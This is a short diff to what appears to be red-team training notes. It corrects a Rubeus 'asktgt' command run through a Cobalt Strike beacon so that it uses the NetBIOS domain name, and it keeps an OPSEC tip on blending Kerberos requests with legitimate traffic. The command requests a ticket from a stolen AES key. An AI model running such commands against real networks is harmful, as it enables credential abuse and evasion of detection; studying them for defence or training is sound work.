@@ -301,8 +301,9 @@ beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:user /domain:corp.loca
 > **OPSEC Alert**: Use AES keys rather than NTLM. Rubeus has an `/opsec` argument which tells it to send the request without pre-auth, to emulate a legit kerberos traffic.
 
 ```
-beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:user /domain:corp.local /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec10 /nowrap /opsec
+beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:user /domain:CORP /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec10 /nowrap /opsec
 ```
+> **Note**: Don't use FQDN `corp.local` to specify the domain. Use the NetBIOS `CORP`.
 
 Once a ticket is created we can check it with `klist`.
 
